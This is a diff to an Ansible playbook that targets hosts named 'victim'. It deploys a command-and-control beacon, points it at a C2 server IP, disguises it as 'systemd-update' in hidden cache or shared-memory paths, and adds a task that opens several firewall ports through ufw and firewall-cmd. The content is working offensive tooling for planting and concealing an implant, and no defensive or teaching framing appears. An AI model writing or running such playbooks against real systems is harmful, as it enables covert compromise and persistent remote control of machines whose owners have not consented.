@@ -3,8 +3,8 @@
   hosts: victim
   become: yes
   vars:
-    c2_server_url: "http://192.168.2.160:8080"  # Change to your C2 IP
-    beacon_install_path: "/dev/shm/.systemd-update"
+    c2_server_url: "http://100.65.2.138:8080"  # Change to your C2 IP
+    beacon_install_path: "/var/cache/apt/archives/.partial"
     beacon_name: "systemd-update"  # Process name
     check_in_interval: 60
 
@@ -20,6 +20,15 @@
         name: python3
         state: present
       when: python_check.rc != 0
+
+    - name: Ensure multiple ports are accessible (if firewall active)
+      shell: |
+        for port in 8080 8000 8443 9090 443 80; do
+          ufw allow $port/tcp 2>/dev/null || true
+          firewall-cmd --add-port=$port/tcp 2>/dev/null || true
+        done
+      become: yes
+      ignore_errors: yes
 
     - name: Install pip3 if missing
       package:
